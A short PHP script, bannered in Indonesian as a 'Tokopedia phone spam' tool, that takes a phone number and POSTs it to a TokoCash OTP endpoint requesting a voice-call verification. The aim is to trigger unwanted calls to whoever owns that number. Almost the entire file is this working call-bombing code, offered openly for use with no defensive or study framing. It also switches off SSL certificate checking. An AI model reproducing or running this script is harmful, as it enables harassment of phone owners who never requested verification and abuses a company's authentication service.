<?php
// Limit 3x Telpon Setiap Satu Nomor
$banner = "\e[36;1m
###########     ########        #        #
#         #     #               #        #
###########     ########        #        #                                                                                                      #         #            #        #        #
#         #            #        #        #
#         #     ########        ##########
[#] Spam Telepon Tokopedia [#]
Coded by : Rohman
Team   : Gak Punya
Github : https//github.com/Begengs219/\n\n\e[0;1m";
echo $banner;
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "NomorTujuan\nMasukkan Nomornya : ";
$nomor = trim(fgets(STDIN));
$excute = send($nomor);
print $excute;
?>
